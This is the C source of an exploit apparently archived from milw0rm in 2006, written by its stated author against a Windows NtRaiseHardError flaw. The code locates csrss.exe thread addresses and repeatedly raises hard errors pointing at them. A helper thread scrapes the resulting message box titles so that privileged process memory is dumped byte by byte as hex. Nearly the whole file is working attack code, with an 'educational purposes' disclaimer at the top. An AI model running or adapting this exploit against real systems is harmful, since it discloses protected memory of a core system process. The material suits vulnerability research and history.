/////////////////////////////////////////
/////////////////////////////////////////
///// Microsoft Windows NtRaiseHardError 
///// Csrss.exe memory disclosure  
/////////////////////////////////////////
///// Ruben Santamarta  
///// ruben at reversemode dot com
///// www.reversemode.com 
/////////////////////////////////////////
///// 12.27.2006
///// For educational purposes ONLY
///// Compiled using gcc (Dev-C++)
////////////////////////////////////////

#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include <ntsecapi.h>


#define UNICODE
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS) 0x00000000)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS) 0xC0000004)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS) 0xC000000D)
#define SystemProcessesAndThreadsInformation	5
#define NTAPI	__stdcall

int gLen=1;


typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);     
  

typedef LONG NTSTATUS;
typedef LONG	KPRIORITY;

typedef struct _CLIENT_ID {
    DWORD	    UniqueProcess;
    DWORD	    UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _VM_COUNTERS {
    SIZE_T	    PeakVirtualSize;
    SIZE_T	    VirtualSize;
    ULONG	    PageFaultCount;
    SIZE_T	    PeakWorkingSetSize;
    SIZE_T	    WorkingSetSize;
    SIZE_T	    QuotaPeakPagedPoolUsage;
    SIZE_T	    QuotaPagedPoolUsage;
    SIZE_T	    QuotaPeakNonPagedPoolUsage;
    SIZE_T	    QuotaNonPagedPoolUsage;
    SIZE_T	    PagefileUsage;
    SIZE_T	    PeakPagefileUsage;
} VM_COUNTERS;


typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER   KernelTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   CreateTime;
    ULONG			WaitTime;
    PVOID			StartAddress;
    CLIENT_ID	    ClientId;
    KPRIORITY	    Priority;
    KPRIORITY	    BasePriority;
    ULONG			ContextSwitchCount;
    LONG			State;
    LONG			WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;



typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG			NextEntryDelta;
    ULONG			ThreadCount;
    ULONG			Reserved1[6];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ProcessName;
    KPRIORITY	    BasePriority;
    ULONG			ProcessId;
    ULONG			InheritedFromProcessId;
    ULONG			HandleCount;
    ULONG			Reserved2[2];
    VM_COUNTERS	    VmCounters;
    IO_COUNTERS	    IoCounters;
    SYSTEM_THREAD_INFORMATION  Threads[5];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
 
  

typedef DWORD (WINAPI* PQUERYSYSTEM)(UINT, PVOID, DWORD,PDWORD);


ULONG GetCsrssThread()
{
	ULONG cbBuffer = 0x5000;
	ULONG tPointer;
    LPVOID pBuffer = NULL;
    NTSTATUS Status;
	PCWSTR pszProcessName;
	DWORD  junk;
	ULONG ThreadCount;
	int i=0,b=0;

	PQUERYSYSTEM NtQuerySystemInformation;
	PSYSTEM_THREAD_INFORMATION pThreads;
	PSYSTEM_PROCESS_INFORMATION pInfo ;

	NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress( LoadLibrary( "ntdll.dll" ),
											   "NtQuerySystemInformation" );

	
	do
    {
        pBuffer = malloc(cbBuffer);
        if (pBuffer == NULL)
        {
            printf(("Not enough memory\n"));
           break;
        }

        Status = NtQuerySystemInformation(
                    SystemProcessesAndThreadsInformation,
                    pBuffer, cbBuffer, NULL);

        if (Status == STATUS_INFO_LENGTH_MISMATCH)
        {
            free(pBuffer);
            cbBuffer *= 2;
        }
        else if (!NT_SUCCESS(Status))
        {
			printf("NtQuerySystemInformation Error! ");
            free(pBuffer);
        }
		
    }   while (Status == STATUS_INFO_LENGTH_MISMATCH);


	pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    for (;;)
    {
		

		if (pInfo->NextEntryDelta == 0)
			break;
		if(pInfo->ProcessName.Buffer!=NULL &&
        !wcsicmp(pInfo->ProcessName.Buffer,L"csrss.exe"))
		{
       
			printf("\n[%ws]  \n\n", pInfo->ProcessName.Buffer);
			printf("5 addresses for testing purposes\n\n");
	       for(b=0;b<5;b++)
           {
             printf("Thread %d -> 0x%x\n",b,pInfo->Threads[b].StartAddress);	
           } 
		   tPointer=(ULONG)pInfo->Threads[1].StartAddress;
        }
		pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo)
						+ pInfo->NextEntryDelta);
    }

    free(pBuffer);
    return tPointer;
}         

VOID WINAPI ReadBox( LPVOID param ) 
{ 

	HWND hWindow,hButton,hText;
	int i=0,b=0;
	int gTemp;
	char lpTitle[300];
	char lpText[300];
	char lpBuff[500];
	 
	for (;;)
	{
	
		lpText[0]=(BYTE)"";
       Sleep(800);
		hWindow = FindWindow("#32770",NULL);
		if(hWindow != NULL)
		{
			GetWindowText(hWindow,(LPSTR)&lpTitle,250);
		    
			hText=FindWindowEx(hWindow,0,"static",0);
		
			GetWindowText(hText,(LPSTR)&lpText,250);
			hText=GetNextWindow(hText,GW_HWNDNEXT);
			
            GetWindowText(hText,(LPSTR)&lpText,250);
		    gTemp = strlen(lpTitle);
            
            if ( gTemp>1 ) gLen = gTemp;
            else gLen = 1;
			
            for(i = 0; i < gTemp; i++)   printf("%.2X",(BYTE)lpTitle[i]);
         
    		   
		    SendMessage(hWindow,WM_CLOSE,0,0);
			
            ZeroMemory((LPVOID)lpTitle,250);
			ZeroMemory((LPVOID)lpText,250);
			ZeroMemory((LPVOID)lpBuff,300);
		}

	}
}



                          
int main()
{
    
   UNICODE_STRING uStr={5,5,L"fun!"};
   ULONG retValue,args[]={0,0,&uStr};
   ULONG csAddr;
   PNTRAISE NtRaiseHardError;    
   int i=0;
    
    system("cls");
    printf("##########################################\n");
    printf("### Microsoft Windows NtRaiseHardError ###\n");
    printf("#####  Csrss.exe memory disclosure  ######\n");
    printf("@@@@@  Xmas Exploit   -   ho ho ho! @@@@@@\n");
    printf("## Ruben Santamarta www.reversemode.com ##\n");
    printf("##########################################\n\n");
   
    NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle("ntdll.dll"),
                                               "NtRaiseHardError");  
   	
    csAddr=GetCsrssThread();
    
    args[0]=csAddr;
  	args[1]=csAddr;
   	printf("\n[+] Capturing Messages \n"); 
          
    CreateThread( NULL,              
				  0,                  
				 (LPTHREAD_START_ROUTINE)ReadBox,        
				  0,             
				  0,                 
				 NULL); 
  
    
				 
	printf("\n[+] Now reading at: [0x%p] - Thread 1\n\n",csAddr);		 
     
   for(;;)
   {
    printf("Reading bytes at [0x%p] : ",args[0]);
    NtRaiseHardError(0x50000018,3,4,args,1,&retValue);
    
    if(retValue && gLen<=1)          printf("00\n");
    else printf("\n");
   
    args[0]+=gLen;
    args[1]+=gLen; 
    }
}

// milw0rm.com [2006-12-27]
